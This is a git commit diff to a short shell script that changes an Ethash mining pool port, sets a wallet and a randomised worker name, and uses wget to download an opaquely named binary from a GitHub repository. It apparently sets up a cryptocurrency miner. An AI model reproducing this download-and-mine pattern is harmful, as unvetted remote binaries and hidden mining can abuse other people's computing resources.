c8e7c1e0c478f091d2fd0b3933a41c83ac0e8d8a
DarshGoswami1982 <87807143+DarshGoswami1982@users.noreply.github.com>
2021-08-22 15:55:01 +0530

    Update dh.sh

--- dh.sh
+++ dh.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=ethash.poolbinance.com:1800
+POOL=ethash.poolbinance.com:3333
 WALLET=DHB
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
